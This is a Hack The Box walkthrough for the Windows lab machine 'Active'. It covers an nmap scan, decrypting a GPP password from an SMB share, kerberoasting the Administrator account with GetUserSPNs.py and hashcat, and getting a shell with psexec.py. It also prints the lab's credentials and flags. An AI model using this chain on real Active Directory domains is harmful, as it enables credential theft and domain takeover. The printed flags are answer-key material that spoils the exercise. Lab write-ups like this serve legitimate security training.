```json
Alias: Active
Date: 05-08_2024
Platform: Hackthebox
OS: Windows
Difficulty: Easy
Status: Complete
IP: 10.129.251.244
```

# Active
# Summary

Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment.

# Used Tools

* smbclient
* GetUserSPNs.py
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-08-05 00:41 PKT
Nmap scan report for 10.129.251.244
Host is up (0.21s latency).
Not shown: 981 closed tcp ports (conn-refused)
PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-08-04 19:42:10Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
7938/tcp  filtered lgtomapper
49152/tcp open     msrpc         Microsoft Windows RPC
49153/tcp open     msrpc         Microsoft Windows RPC
49154/tcp open     msrpc         Microsoft Windows RPC
49155/tcp open     msrpc         Microsoft Windows RPC
49157/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open     msrpc         Microsoft Windows RPC
49165/tcp open     msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-08-04T19:43:08
|_  start_date: 2024-08-04T19:31:55
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
```
## Discovered Subdomains
```
active.htb
```

---
# Enumeration
## Port 445 - SMB (SMBV2)
SMB Null Session enabled.

- [x] Enumerated
- [x] Vulnerable

---

# Exploitation

We have read permission on a Share named Replication which contains Group Policies that contains the Password for active.htb\SVC_TGS We can use Get-DecryptedCPassword Script to get it.

```powershell
Get-DecryptedCPassword 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
```

After decrypting we get the following set of credentials 

| Username           | Password                   |
| ------------------ | -------------------------- |
| active.htb\SVC_TGS | GPPstillStandingStrong2k18 |

Checking the SMB Shares again we have access to the Users Directory and we can get the user flag from SVC_TGS Desktop.


---
# Privilege Escalation
If we search for SPNs we will notice that the Administrator account is vulnerable to kerberoasting.

```bash
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -save -outputfile SPN.hash
```

Use hashcat to crack the TGS
```bash
hashcat -m 13100 SPN.hash ~/Documents/Wordlists/rockyou.txt
```

and get the following credential

| Username      | Password         |
| ------------- | ---------------- |
| Administrator | Ticketmaster1968 |

Use psexec to get shell
```bash
psexec.py Administrator:Ticketmaster1968@$IP
```

---

# Flags
- 5b88410842f7baf80ad4c194a2864130
- 18d62e1a391c06fdb267326ecb8cbf57

#CTF #CTF/Hackthebox #CTF/Hackthebox/Easy #Windows #ActiveDirectory #ActiveDirectory/Kerberoasting #ActiveDirectory/SMB